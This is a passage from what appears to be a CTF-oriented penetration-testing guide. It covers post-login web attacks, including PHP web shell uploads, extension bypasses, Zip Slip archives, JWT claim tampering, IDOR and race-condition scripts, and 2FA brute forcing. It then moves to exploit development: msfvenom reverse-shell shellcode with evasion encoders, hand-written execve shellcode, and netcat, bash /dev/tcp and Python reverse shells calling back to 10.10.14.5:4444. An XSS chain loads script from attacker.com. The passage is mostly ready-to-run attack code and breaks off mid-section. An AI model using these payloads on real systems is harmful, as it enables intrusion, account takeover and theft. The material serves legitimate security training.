# If application doesn't validate 'state':
# Attacker can link victim's OAuth account to attacker's app account

# Testing:
# 1. Start OAuth flow, note 'state' value
# 2. Modify 'state' parameter
# 3. Complete flow
# VULNERABILITY: If success despite modified state, CSRF vulnerable
```

### File Upload Post-Authentication

**Unrestricted file upload exploitation:**

```bash
# Test 1: Upload web shell

# Create PHP web shell
cat > shell.php << 'EOF'
<?php system($_GET['cmd']); ?>
EOF

# Upload as profile picture or document
curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@shell.php"

# Response: {"url": "https://target/uploads/shell.php"}

# Execute commands
curl "https://target/uploads/shell.php?cmd=whoami"

# Test 2: Extension bypass

# If .php blocked, try:
shell.php.jpg      # Double extension
shell.php5         # Alternative PHP extension
shell.php%
.txt # Null byte (older systems) 
shell.pHp # Case variation 
shell.PhP 
shell.phtml # Alternative extension 
shell.php.png # Append safe extension 
shell.jsp # Java 
shell.asp # ASP 
shell.aspx # ASP.NET

# Test 3: MIME type bypass

# Upload shell.php but set MIME to image/jpeg

curl -X POST "https://target/api/upload"  
-H "Authorization: Bearer USER_TOKEN"  
-F "file=@shell.php;type=image/jpeg"

# Test 4: Content-Type header manipulation

curl -X POST "https://target/api/upload"  
-H "Authorization: Bearer USER_TOKEN"  
-H "Content-Type: image/png"  
-F "file=@shell.php"

````

**Image-based exploits (authenticated users):**

```bash
# Polyglot file (valid image + PHP code)

# Create polyglot PNG+PHP
echo '<?php system($_GET["cmd"]); ?>' > shell.php
cat shell.php /usr/share/pixmaps/kali-logo.png > polyglot.php.png

# Or using exiftool to inject PHP in metadata
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg -o shell.jpg

# Upload polyglot
curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@polyglot.php.png"

# Access with PHP extension if server processes
curl "https://target/uploads/polyglot.php.png?cmd=id"

# SVG with embedded JavaScript (if rendered in browser)
cat > xss.svg << 'EOF'
<svg xmlns="http://www.w3.org/2000/svg">
  <script>alert(document.cookie)</script>
</svg>
EOF

curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@xss.svg"
# VULNERABILITY: If SVG displayed without sanitization, XSS triggers
````

**Path traversal in upload:**

```bash
# Scenario: Application saves files using user-provided filename

# Test 1: Directory traversal
curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@shell.php;filename=../../../var/www/html/shell.php"

# Test 2: Absolute path
curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@shell.php;filename=/var/www/html/shell.php"

# Test 3: Windows path traversal
curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@shell.php;filename=..\..\..\..\inetpub\wwwroot\shell.php"

# VULNERABILITY: Files written to arbitrary locations
```

**Archive extraction exploits (Zip Slip):**

```bash
# Create malicious ZIP with path traversal

# Using Python
python3 << 'EOF'
import zipfile

with zipfile.ZipFile('malicious.zip', 'w') as zf:
    # Add file with traversal path
    zf.writestr('../../../../var/www/html/shell.php', '<?php system($_GET["c"]); ?>')
    zf.writestr('../../../shell.php', '<?php system($_GET["c"]); ?>')
EOF

# Upload malicious archive
curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@malicious.zip"

# If server auto-extracts, shell placed in traversed path
# VULNERABILITY: Zip Slip - CVE-2018-1002200 (if applicable)

# Test symlink attack (Zip archive with symlink)
ln -s /etc/passwd link.txt
zip --symlinks symlink.zip link.txt

curl -X POST "https://target/api/upload" \
  -H "Authorization: Bearer USER_TOKEN" \
  -F "file=@symlink.zip"

# If extracted and symlinks followed, may read arbitrary files
```

### API Key & Token Manipulation

**API key privilege escalation:**

```bash
# Scenario: Users can generate API keys post-authentication

# Generate standard user API key
curl -X POST "https://target/api/keys/create" \
  -H "Authorization: Bearer USER_JWT" \
  -d '{"name":"my-key","scope":"read"}'
# Response: {"key": "sk_user_abc123", "scope": "read"}

# Test 1: Analyze key structure
# sk_user_abc123
# sk = prefix
# user = role indicator?
# abc123 = random component

# Try crafting admin key by modifying role component
# sk_admin_abc123

curl -X GET "https://target/api/admin/users" \
  -H "X-API-Key: sk_admin_abc123"

# Test 2: Scope manipulation during creation
curl -X POST "https://target/api/keys/create" \
  -H "Authorization: Bearer USER_JWT" \
  -d '{"name":"escalated","scope":"admin"}'

# Test 3: Inject additional scopes
curl -X POST "https://target/api/keys/create" \
  -H "Authorization: Bearer USER_JWT" \
  -d '{"name":"key","scope":["read","write","admin"]}'

# VULNERABILITY: Server accepts escalated scope without validation
```

**JWT claim manipulation:**

```bash
# Common privilege-related claims to test:

# Test 1: Modify 'role' claim
# Original JWT payload:
# {"user_id": 123, "role": "user", "exp": 1234567890}

# Use jwt_tool to modify
python3 jwt_tool.py <JWT> -T -pc "role" -pv "admin"

# Test 2: Add 'admin' claim
python3 jwt_tool.py <JWT> -T -I -pc "admin" -pv "true"

# Test 3: Modify 'permissions' array
# Original: {"permissions": ["read", "write"]}
# Modified: {"permissions": ["read", "write", "admin", "delete"]}

# Test 4: Change user_id to admin's ID
# Requires knowing admin user ID (enumerate via API)
python3 jwt_tool.py <JWT> -T -pc "user_id" -pv "1"  # Often admin is ID 1

# Test 5: Remove expiration
# Delete 'exp' claim to test if server validates expiration
python3 jwt_tool.py <JWT> -T -R -rc "exp"

# Test 6: Extend expiration
# Original: "exp": 1609459200  # 2021-01-01
# Modified: "exp": 9999999999  # Year 2286
python3 jwt_tool.py <JWT> -T -pc "exp" -pv "9999999999"
```

### IDOR (Insecure Direct Object Reference) Post-Auth

**Systematic IDOR testing:**

```bash
# Scenario: Authenticated user can access own resources

# Step 1: Identify resource endpoints
# Login as User A (ID: 100)
curl -X GET "https://target/api/profile" \
  -H "Authorization: Bearer USER_A_TOKEN"
# Response: {"id": 100, "name": "User A", "email": "a@test.com"}

# Step 2: Access own resource by ID
curl -X GET "https://target/api/users/100" \
  -H "Authorization: Bearer USER_A_TOKEN"
# Successful (own data)

# Step 3: Test access to other user's resource
curl -X GET "https://target/api/users/101" \
  -H "Authorization: Bearer USER_A_TOKEN"
# VULNERABILITY: If returns User B's data, IDOR exists

# Step 4: Test modification
curl -X PUT "https://target/api/users/101" \
  -H "Authorization: Bearer USER_A_TOKEN" \
  -d '{"email":"hacked@evil.com"}'
# VULNERABILITY: If succeeds, can modify other users

# Step 5: Test deletion
curl -X DELETE "https://target/api/users/101" \
  -H "Authorization: Bearer USER_A_TOKEN"
# VULNERABILITY: Can delete other users
```

**IDOR with non-numeric identifiers:**

```bash
# UUIDs
# Access own: /api/documents/550e8400-e29b-41d4-a716-446655440000
# Enumerate: Generate valid UUIDs or brute force
for uuid in $(cat uuid_list.txt); do
  curl -s "https://target/api/documents/$uuid" \
    -H "Authorization: Bearer TOKEN" | grep -q "title" && echo "Found: $uuid"
done

# GUIDs (similar approach)

# Base64-encoded IDs
# /api/items/MTIzNDU2  (base64 of "123456")
echo "MTIzNDU2" | base64 -d  # Decode to 123456
# Increment and re-encode
echo "123457" | base64  # MTIzNDU3
curl "https://target/api/items/MTIzNDU3" -H "Authorization: Bearer TOKEN"

# Hashed IDs (if weak hash)
# /api/orders/5f4dcc3b5aa765d61d8327deb882cf99  (MD5 of "password")
# If predictable input (sequential IDs, timestamps), can brute force

# MongoDB ObjectIDs
# Format: 4-byte timestamp + 5-byte random + 3-byte counter
# /api/posts/507f1f77bcf86cd799439011
# Can generate valid ObjectIDs from timestamp range
```

**IDOR automation script:**

```python
#!/usr/bin/env python3
import requests
import sys

target = "https://target/api/users"
token = "user_token_here"
headers = {"Authorization": f"Bearer {token}"}

# Test range of IDs
for user_id in range(1, 1000):
    url = f"{target}/{user_id}"
    r = requests.get(url, headers=headers)
    
    if r.status_code == 200:
        print(f"[+] Accessible: {user_id}")
        # Check if data belongs to authenticated user
        data = r.json()
        if data.get('id') != 100:  # Assuming authenticated user ID is 100
            print(f"[!] IDOR FOUND: Can access user {user_id}")
            print(f"    Data: {data}")
    elif r.status_code == 403:
        print(f"[-] Forbidden: {user_id} (proper authorization)")
    elif r.status_code == 404:
        print(f"[~] Not found: {user_id}")
```

**IDOR with parameter pollution:**

```bash
# Scenario: Endpoint uses multiple ID parameters

# Normal request
curl "https://target/api/transfer?from=100&to=200&amount=50" \
  -H "Authorization: Bearer USER_100_TOKEN"
# Transfers $50 from account 100 (authenticated user) to account 200

# Test parameter pollution
curl "https://target/api/transfer?from=200&to=100&amount=1000" \
  -H "Authorization: Bearer USER_100_TOKEN"
# VULNERABILITY: If succeeds, can transfer from other accounts

# Test with duplicate parameters
curl "https://target/api/transfer?from=100&from=200&to=100&amount=1000" \
  -H "Authorization: Bearer USER_100_TOKEN"
# VULNERABILITY: Backend may process second 'from' value

# Array parameter injection
curl "https://target/api/transfer" \
  -H "Authorization: Bearer USER_100_TOKEN" \
  -d '{"from": [100, 200], "to": 100, "amount": 1000}'
# VULNERABILITY: Backend processes as from=200 due to array handling
```

### Rate Limiting & Account Enumeration

**Testing rate limits post-authentication:**

```bash
# Brute force endpoint without rate limiting

# Password change endpoint
for i in {1..1000}; do
  curl -s -X POST "https://target/api/change-password" \
    -H "Authorization: Bearer TOKEN" \
    -d "current=wrong$i&new=test123" &
done
# VULNERABILITY: No rate limit allows brute forcing current password

# 2FA code verification
for code in {000000..999999}; do
  response=$(curl -s -X POST "https://target/api/verify-2fa" \
    -H "Cookie: session=ABC" \
    -d "code=$code")
  
  [[ "$response" == *"success"* ]] && echo "Valid: $code" && break
done
# VULNERABILITY: Can brute force 2FA codes

# API key usage limits
for i in {1..10000}; do
  curl -s "https://target/api/data" -H "X-API-Key: KEY" > /dev/null
done
# Check if all requests succeed or rate limited
```

**Account enumeration post-authentication:**

```bash
# User search/lookup feature

# Test 1: Timing attacks
time curl -X POST "https://target/api/users/search" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"email":"existing@test.com"}'
# Response time: 150ms

time curl -X POST "https://target/api/users/search" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"email":"nonexistent@test.com"}'
# Response time: 50ms

# VULNERABILITY: Timing difference reveals account existence

# Test 2: Response difference
curl -X POST "https://target/api/friend/add" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"username":"existing_user"}'
# Response: {"status": "pending"}

curl -X POST "https://target/api/friend/add" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"username":"nonexistent_user"}'
# Response: {"error": "user not found"}

# VULNERABILITY: Response reveals user existence

# Test 3: Error message differences
# Existing user: "Friend request sent"
# Non-existing: "User does not exist"
# Account locked: "Cannot send request to this user"
```

### WebSocket Exploitation Post-Auth

**WebSocket authorization bypass:**

```bash
# Scenario: Application uses WebSocket for real-time features

# Test 1: Initial connection without authorization
wscat -c "wss://target/ws"
# If connects without token: VULNERABILITY

# Test 2: Connection with token, but no message validation
wscat -c "wss://target/ws" -H "Authorization: Bearer USER_TOKEN"

# Send admin command
> {"action": "deleteUser", "userId": 123}

# VULNERABILITY: WebSocket doesn't validate authorization per message

# Test 3: Connection hijacking
# User A connects: wss://target/ws?session=abc123
# User B uses same session: wss://target/ws?session=abc123
# VULNERABILITY: Multiple connections to same session
```

**WebSocket message injection:**

```javascript
// Client-side test (browser console)

// Connect to WebSocket
const ws = new WebSocket('wss://target/ws');

ws.onopen = function() {
  // Normal message
  ws.send(JSON.stringify({
    type: 'chat',
    message: 'Hello'
  }));
  
  // Inject admin message
  ws.send(JSON.stringify({
    type: 'admin',
    action: 'promote',
    userId: 123,
    role: 'admin'
  }));
  
  // Inject system message
  ws.send(JSON.stringify({
    type: 'system',
    command: 'broadcast',
    message: '<script>alert(1)</script>'
  }));
};

// VULNERABILITY: Server processes injected admin/system messages
```

### Mass Assignment Advanced Exploitation

**Identifying hidden fields:**

```bash
# Method 1: Analyze admin panel requests
# Login as admin (if possible) or analyze leaked admin JS
# Look for fields regular users don't have access to

# Method 2: Schema introspection (GraphQL)
curl -X POST "https://target/graphql" \
  -H "Content-Type: application/json" \
  -d '{"query":"{ __type(name: \"User\") { fields { name type { name } } } }"}'

# Response shows all User fields:
# id, email, name, role, isAdmin, credits, etc.

# Method 3: API documentation
curl "https://target/api-docs"
curl "https://target/swagger.json"

# Method 4: Error messages
# Send malformed request to trigger detailed error
curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"invalid_field": "test"}'
# Error may reveal valid field names
```

**Exploitation:**

```bash
# Test each discovered field

# Normal update
curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name":"Updated Name"}'

# Test hidden fields one by one
curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name":"Test","is_admin":true}'

curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name":"Test","role":"administrator"}'

curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name":"Test","credits":999999}'

curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"name":"Test","verified":true,"premium":true}'

# VULNERABILITY: Any field that updates indicates mass assignment flaw
```

### Business Logic Exploits Post-Authentication

**Price manipulation:**

```bash
# E-commerce application

# Normal purchase flow
curl -X POST "https://target/api/cart/add" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"product_id":123,"quantity":1}'

curl -X POST "https://target/api/checkout" \
  -H "Authorization: Bearer TOKEN"

# Intercept checkout request
# Original: {"items":[{"id":123,"price":99.99,"quantity":1}]}

# Test 1: Modify price
curl -X POST "https://target/api/checkout" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"items":[{"id":123,"price":0.01,"quantity":1}]}'

# Test 2: Negative quantity (refund attack)
curl -X POST "https://target/api/checkout" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"items":[{"id":123,"price":99.99,"quantity":-10}]}'
# VULNERABILITY: If total becomes negative, receive money

# Test 3: Integer overflow
curl -X POST "https://target/api/checkout" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"items":[{"id":123,"price":99.99,"quantity":2147483647}]}'
# May overflow to negative value
```

**Coupon/discount abuse:**

```bash
# Test 1: Multiple coupon application
curl -X POST "https://target/api/apply-coupon" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"code":"SAVE10"}'  # 10% off

curl -X POST "https://target/api/apply-coupon" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"code":"SAVE20"}'  # 20% off
# VULNERABILITY: If both apply, 30% total discount

# Test 2: Coupon reuse
# Use coupon on order 1
# Use same coupon on order 2
# VULNERABILITY: Single-use coupon used multiple times

# Test 3: Expired coupon
curl -X POST "https://target/api/apply-coupon" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"code":"EXPIRED2020"}'
# VULNERABILITY: No expiration validation

# Test 4: Array of coupons
curl -X POST "https://target/api/apply-coupon" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"code":["SAVE10","SAVE20","SAVE30"]}'
# VULNERABILITY: Processes multiple codes
```

**Race conditions:**

```bash
# Test 1: Double spending

# Create two simultaneous requests
curl -X POST "https://target/api/transfer" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"from":100,"to":200,"amount":1000}' &

curl -X POST "https://target/api/transfer" \
  -H "Authorization: Bearer TOKEN" \
  -d '{"from":100,"to":300,"amount":1000}' &

# VULNERABILITY: If both succeed but balance is only 1000,
# money duplicated due to race condition

# Test 2: Limited resource claim (concert tickets, limited items)
for i in {1..100}; do
  curl -s -X POST "https://target/api/purchase" \
    -H "Authorization: Bearer TOKEN" \
    -d '{"item_id":999}' &  # Only 10 available
done

# VULNERABILITY: May purchase more than available quantity

# Automated race condition testing
# Use Turbo Intruder (Burp extension)
# Or custom script with threading
```

**Python race condition script:**

```python
#!/usr/bin/env python3
import requests
import threading

url = "https://target/api/redeem-voucher"
headers = {"Authorization": "Bearer TOKEN"}
data = {"voucher_code": "SINGLE_USE_CODE"}

def make_request():
    r = requests.post(url, headers=headers, json=data)
    print(f"Response: {r.status_code} - {r.text}")

# Launch 10 simultaneous requests
threads = []
for i in range(10):
    t = threading.Thread(target=make_request)
    threads.append(t)
    t.start()

# Wait for completion
for t in threads:
    t.join()

# VULNERABILITY: If multiple succeed, single-use voucher used multiple times
```

## Advanced Post-Auth Exploitation Chains

**Chaining XSS + CSRF + IDOR:**

```javascript
// Scenario: XSS in profile page + no CSRF protection + IDOR

// Step 1: Inject XSS payload in profile
// POST /api/profile
// {"bio": "<script src='https://attacker.com/exploit.js'></script>"}

// Step 2: exploit.js performs admin actions
// (Victim admin views attacker's profile, XSS triggers)

// exploit.js content:
fetch('/api/users/123', {
  method: 'DELETE'  // IDOR: Delete arbitrary user
});

fetch('/api/admin/promote', {
  method: 'POST',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({user_id: 999, role: 'admin'})
  // CSRF: No token validation
});

// Result: Admin unknowingly deletes user and promotes attacker
```

**Chaining mass assignment + privilege escalation:**

```bash
# Step 1: Discover mass assignment in profile update
curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"name":"Test","is_verified":true}'
# is_verified updates successfully

# Step 2: Identify privileged functionality requiring verification
curl -X POST "https://target/api/admin/access" \
  -H "Authorization: Bearer USER_TOKEN"
# Response: "Only verified users can access"

# Step 3: Escalate via mass assignment
curl -X PUT "https://target/api/profile" \
  -H "Authorization: Bearer USER_TOKEN" \
  -d '{"is_verified":true,"is_admin":true}'

# Step 4: Access admin panel
curl -X GET "https://target/api/admin/dashboard" \
  -H "Authorization: Bearer USER_TOKEN"
# Success: Full admin access
```

## Detection & Mitigation Testing

**Testing for proper authorization:**

```bash
# Create checklist for each endpoint

# Endpoint: DELETE /api/users/:id
# Test cases:
# 1. Unauthenticated access -> 401
# 2. Authenticated user, own ID -> 200 or 403 (depends on policy)
# 3. Authenticated user, other ID -> 403
# 4. Authenticated admin, any ID -> 200
# 5. Expired token -> 401
# 6. Invalid token -> 401
# 7. Token with modified claims -> 401/403

# Automation
python3 << 'EOF'
import requests

tests = [
    ("No auth", None, 401),
    ("Valid user token", "user_token", 403),
    ("Valid admin token", "admin_token", 200),
    ("Expired token", "expired_token", 401),
]

for name, token, expected in tests:
    headers = {"Authorization": f"Bearer {token}"} if token else {}
    r = requests.delete("https://target/api/users/999", headers=headers)
    
    status = "✓" if r.status_code == expected else "✗"
    print(f"{status} {name}: {r.status_code} (expected {expected})")
EOF
```

## Key Takeaways & Methodology

**Systematic testing approach:**

1. **Map application**: Document all endpoints, roles, and resources
2. **Test authentication boundaries**: What's accessible before/after login?
3. **Test authorization boundaries**: What's accessible at each privilege level?
4. **Test object references**: Can users access/modify other users' resources?
5. **Test function access**: Can users execute privileged functions?
6. **Test session security**: Token/session manipulation, fixation, hijacking
7. **Test business logic**: Price manipulation, race conditions, workflow bypass

**Critical areas for CTF scenarios:**

- **JWT vulnerabilities**: Algorithm confusion, weak secrets, claim manipulation
- **IDOR**: Most common post-auth vulnerability, test all resource endpoints
- **Mass assignment**: Inject privileged fields in update requests
- **File upload**: Path traversal, web shell upload, polyglot files
- **API authorization**: Function-level bypass, HTTP method tampering
- **Business logic**: Race conditions, price/quantity manipulation
- **Session management**: Fixation, token reuse, concurrent sessions

**Important related topics to explore:**

- **Server-Side Request Forgery (SSRF) in authenticated contexts**: Using file upload, webhooks, or profile features to trigger internal requests
- **XXE (XML External Entity) post-authentication**: Processing user-uploaded XML files
- **Template Injection (SSTI) in authenticated features**: Profile rendering, report generation
- **Deserialization attacks**: Processing user-provided serialized objects in authenticated sessions

---

# Exploit Development & Payload Crafting

## Shellcode Generation

### Understanding Shellcode

Shellcode is position-independent machine code that executes a payload, typically used in buffer overflow and other memory corruption exploits. In CTF contexts, shellcode commonly spawns shells or executes specific commands.

### MSFVenom - Primary Shellcode Generation Tool

**Basic Shellcode Generation:**

```bash
# Linux x86 reverse shell
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Linux x64 reverse shell
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Windows x86 reverse shell
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Windows x64 reverse shell
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c
```

**Output Format Options (-f flag):**

```bash
# C array format (for exploit development)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Python format
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f python

# Raw binary
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw > shellcode.bin

# Hex format
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f hex

# Base64 encoded
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw | base64

# Executable formats
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
```

**Bad Character Avoidance:**

```bash
# Exclude null bytes (0x00) - most common restriction
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00' -f c

# Exclude multiple bad characters
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00\x0a\x0d' -f c

# Exclude newline and carriage return (common in string operations)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -b '\x00\x0a\x0d\x20' -f python
```

**Encoding for Evasion:**

```bash
# List available encoders
msfvenom -l encoders

# x86 Shikata Ga Nai encoder (polymorphic)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -f c

# Multiple encoding iterations
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/shikata_ga_nai -i 5 -f c

# x64 XOR encoder
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x64/xor -f c
```

**Common Payload Types:**

```bash
# Execute specific command (Linux)
msfvenom -p linux/x86/exec CMD="/bin/cat /etc/passwd" -f c

# Execute command (Windows)
msfvenom -p windows/exec CMD="calc.exe" -f c

# Read file and send over network
msfvenom -p linux/x86/read_file PATH=/etc/passwd FD=1 -f c

# Add user (Linux)
msfvenom -p linux/x86/adduser USER=hacker PASS=password123 -f c

# Staged vs Non-staged payloads
# Non-staged (complete payload, larger)
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c

# Staged (two-stage, smaller initial payload)
msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c
```

**Platform-Specific Payloads:**

```bash
# List all payloads
msfvenom -l payloads

# Linux payloads
msfvenom -l payloads | grep "linux/"

# Windows payloads
msfvenom -l payloads | grep "windows/"

# BSD payloads
msfvenom -l payloads | grep "bsd/"

# macOS payloads
msfvenom -l payloads | grep "osx/"
```

### Pwntools Shellcode Generation

**Installation:**

```bash
pip3 install pwntools
```

**Basic Shellcode with Pwntools:**

```python
#!/usr/bin/env python3
from pwn import *

# Set target architecture
context.arch = 'amd64'  # or 'i386', 'arm', 'mips'
context.os = 'linux'

# Generate shellcode for /bin/sh
shellcode = asm(shellcraft.sh())
print(shellcode)

# Generate hex representation
print(hexdump(shellcode))

# Execute specific command
shellcode = asm(shellcraft.execve('/bin/cat', ['/etc/passwd']))
print(hexdump(shellcode))
```

**Advanced Pwntools Shellcode:**

```python
#!/usr/bin/env python3
from pwn import *

context.arch = 'amd64'

# Connect back reverse shell
shellcode = asm(shellcraft.connect('10.10.14.5', 4444) + shellcraft.dupsh())

# Read file
shellcode = asm(shellcraft.cat('/flag.txt'))

# List directory
shellcode = asm(shellcraft.execve('/bin/ls', ['-la', '/']))

# Download file
shellcode = asm(shellcraft.cat('/etc/passwd', fd=1))

# Chain multiple operations
shellcode = asm(
    shellcraft.open('/flag.txt') +
    shellcraft.read('rax', 'rsp', 100) +
    shellcraft.write(1, 'rsp', 100)
)
```

### Manual Shellcode Writing

**Linux x86 /bin/sh Shellcode:**

```nasm
; execve("/bin/sh", NULL, NULL)
xor eax, eax        ; Clear EAX
push eax            ; Push NULL terminator
push 0x68732f2f     ; Push "//sh"
push 0x6e69622f     ; Push "/bin"
mov ebx, esp        ; EBX = pointer to "/bin//sh"
xor ecx, ecx        ; ECX = NULL (argv)
xor edx, edx        ; EDX = NULL (envp)
mov al, 0x0b        ; syscall number for execve
int 0x80            ; Execute syscall
```

**Compile and Extract:**

```bash
# Assemble
nasm -f elf32 shellcode.asm -o shellcode.o

# Link
ld -m elf_i386 shellcode.o -o shellcode

# Extract opcodes
objdump -d shellcode | grep '[0-9a-f]:' | grep -v 'file' | cut -f2 -d: | cut -f1-6 -d' ' | tr -s ' ' | tr '\t' ' ' | sed 's/ $//g' | sed 's/ /\\x/g' | paste -d '' -s

# Alternative extraction
for i in $(objdump -d shellcode | grep "^ " | cut -f2); do echo -n '\x'$i; done; echo
```

**Linux x64 /bin/sh Shellcode:**

```nasm
; execve("/bin/sh", NULL, NULL) - x64
xor rsi, rsi        ; RSI = NULL (argv)
push rsi            ; Push NULL terminator
mov rdi, 0x68732f6e69622f2f  ; "/bin//sh"
push rdi
push rsp
pop rdi             ; RDI = pointer to "/bin//sh"
xor rdx, rdx        ; RDX = NULL (envp)
mov al, 0x3b        ; syscall number for execve
syscall
```

**Testing Shellcode:**

```c
// test_shellcode.c
#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = 
"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
"\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80";

int main() {
    printf("Shellcode Length: %d\n", strlen(shellcode));
    int (*ret)() = (int(*)())shellcode;
    ret();
}
```

```bash
# Compile with executable stack
gcc -fno-stack-protector -z execstack -m32 test_shellcode.c -o test_shellcode

# Run
./test_shellcode
```

### Alphanumeric Shellcode

**Use Case:** When input is restricted to alphanumeric characters only.

**MSFVenom with Alpha Encoder:**

```bash
# x86 alphanumeric shellcode
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/alpha_mixed -f c

# Force uppercase only
msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -e x86/alpha_upper -f c
```

### Null-Free Shellcode Techniques

**XOR Encoding:**

```nasm
; Instead of: mov eax, 0
; Use:
xor eax, eax        ; Results in 0, no null bytes

; Instead of: push 0
; Use:
xor eax, eax
push eax
```

**Subtraction Technique:**

```nasm
; Set register to specific value without nulls
mov eax, 0x01010101
sub eax, 0x01010100  ; EAX now = 1, no null bytes used
```

## Reverse Shell Techniques

### Netcat Listeners

**Basic Listener Setup:**

```bash
# Standard listener
nc -lvnp 4444

# Verbose output
nc -lvnp 4444 -v

# Save connection output
nc -lvnp 4444 > output.txt

# Keep listening after disconnect
while true; do nc -lvnp 4444; done
```

**Netcat Reverse Shells (from target):**

```bash
# Linux - /bin/bash
nc 10.10.14.5 4444 -e /bin/bash

# Linux - /bin/sh
nc 10.10.14.5 4444 -e /bin/sh

# Windows - cmd.exe
nc.exe 10.10.14.5 4444 -e cmd.exe

# Windows - PowerShell
nc.exe 10.10.14.5 4444 -e powershell.exe
```

**Netcat Without -e Flag:**

```bash
# Linux - named pipe method
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.10.14.5 4444 > /tmp/f

# Linux - alternative with bash
/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# Using mknod
mknod /tmp/backpipe p; /bin/sh 0</tmp/backpipe | nc 10.10.14.5 4444 1>/tmp/backpipe
```

### Bash Reverse Shells

**TCP Socket Method:**

```bash
# Basic bash reverse shell
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1

# Alternative syntax
bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'

# With exec
exec 5<>/dev/tcp/10.10.14.5/4444; cat <&5 | while read line; do $line 2>&5 >&5; done

# UDP variant
bash -i >& /dev/udp/10.10.14.5/4444 0>&1
```

**URL Encoded (for web injection):**

```
bash+-c+'bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261'
```

**Base64 Encoded (to avoid special characters):**

```bash
# Encode payload
echo "bash -i >& /dev/tcp/10.10.14.5/4444 0>&1" | base64
# Output: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=

# Execute encoded payload
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo= | base64 -d | bash

# One-liner
bash -c '{echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC41LzQ0NDQgMD4mMQo=}|{base64,-d}|{bash,-i}'
```

### Python Reverse Shells

**Python 2:**

```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

**Python 3:**

```python
